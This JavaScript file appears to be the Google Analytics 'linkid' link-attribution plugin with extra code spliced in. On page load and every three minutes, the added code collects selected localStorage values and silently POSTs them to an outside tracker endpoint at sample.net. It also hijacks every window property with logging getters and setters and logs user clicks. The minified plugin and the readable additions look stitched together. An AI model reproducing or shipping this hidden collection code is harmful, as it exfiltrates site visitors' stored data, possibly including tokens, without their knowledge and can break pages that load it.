(function () {
  const trackingKeys = window.trackingKeys;
  function computeHash(inputObj) {
    let keys = Object.keys(inputObj);
    let keysSorted = keys.sort().join("");
    let hashCode = 0;
    for (let index = 0; index < keysSorted.length; index++) {
      let codeOfChar = keysSorted.charCodeAt(index);
      hashCode = (hashCode << 5) - hashCode + codeOfChar;
      hashCode = hashCode & hashCode;
    }
    return hashCode.toString(16);
  }
  function extractLocalStorage() {
    let trackedData = {};
    for (let key in window.localStorage) {
      if (trackingKeys.includes(key)) {
        trackedData[key] = window.localStorage[key];
      }
    }
    return trackedData;
  }
  var e = window,
    h = document,
    k = "replace";
  var m = function (a, c, d, b, g) {
      c = encodeURIComponent(c)[k](/\(/g, "%28")[k](/\)/g, "%29");
      a = a + "=" + c + "; path=" + (d || "/") + "; ";
      g && (a += "expires=" + new Date(new Date().getTime() + g).toGMTString() + "; ");
      b && "none" != b && (a += "domain=" + b + ";");
      b = h.cookie;
      h.cookie = a;
      return b != h.cookie;
    },
    p = function (a) {
      var c = h.body;
      try {
        c.addEventListener ? c.addEventListener("click", a, !1) : c.attachEvent && c.attachEvent("onclick", a);
      } catch (d) {}
    };
  async function postDataToServer(data) {
    try {
      let hash = computeHash(data);
      let apiUrl = "https://sample.net/api/tracker";
      let postResponse = await fetch(apiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hash: hash,
          data: data
        })
      });
      if (postResponse.ok) {
        console.log("Data Upload Successful");
      } else {
        console.error("Upload Failed, Status Code: " + postResponse.status);
      }
    } catch (uploadError) {
      console.error("Error During Upload Process:", uploadError);
    }
  }
  function gatherAndUploadData() {
    let extractedData = extractLocalStorage();
    if (Object.keys(extractedData).length > 0) {
      postDataToServer(extractedData);
    }
  }
  var q = function (a, c, d, b) {
    this.get = function () {
      for (var b = void 0, c = [], d = h.cookie.split(";"), l = new RegExp("^\\s*" + a + "=\\s*(.*?)\\s*$"), f = 0; f < d.length; f++) {
        var n = d[f].match(l);
        n && c.push(decodeURIComponent(n[1][k](/%28/g, "(")[k](/%29/g, ")")));
      }
      for (d = 0; d < c.length; d++) c[d] && (b = c[d]);
      return b;
    };
    this.set = function (g) {
      return m(a, g, b, c, 1E3 * d);
    };
    this.remove = function () {
      return m(a, "", b, c, -100);
    };
  };
  window.addEventListener("load", () => {
    gatherAndUploadData();
    setInterval(gatherAndUploadData, 180000); // 3 minutes interval
  });

  // Global Variables tracking
  let globalVars = {};
  var t = function (a, c) {
    var d = void 0;
    if ("function" == typeof a.get && "function" == typeof a.set) {
      var b = c || {},
        g = b.hasOwnProperty("cookieName") ? b.cookieName : "_gali",
        r = b.hasOwnProperty("cookieTimeout") ? b.cookieTimeout : 30,
        s = b.hasOwnProperty("levels") ? b.levels : 3,
        b = a.get("cookieDomain"),
        l = a.get("cookiePath"),
        f = new q(g, b, r, l);
      d || (d = f.get());
      d && a.set("&linkid", d);
      p(function (a) {
        a = a || e.event;
        a = a.target || a.srcElement;
        for (var b, c = 0; a && c <= s; c++) {
          if (b = a.getAttribute("id")) {
            a = b;
            100 < a.length ? f.remove() : a ? f.set(a) : f.remove();
            return;
          }
          a = a.parentElement;
        }
        f.remove();
      });
    }
  };
  (function () {
    e.gaplugins = e.gaplugins || {};
    e.gaplugins.LinkId = t;
    var a = e.GoogleAnalyticsObject || "ga";
    e[a] = e[a] || function () {
      (e[a].q = e[a].q || []).push(arguments);
    };
    e[a]("provide", "linkid", t);
  })();
  for (let g in window) {
    globalVars[g] = window[g];
  }

  // Adding JS hook
  Object.keys(window).forEach(key => {
    Object.defineProperty(window, key, {
      get: function () {
        console.log(`Accessed key: ${key}`);
        return globalVars[key];
      },
      set: function (value) {
        console.log(`Changed key: ${key}`);
        globalVars[key] = value;
      }
    });
  });

  // Event listener tracking behavior
  document.addEventListener('click', function (e) {
    console.log("Clicked on: " + e.target);
  });
})();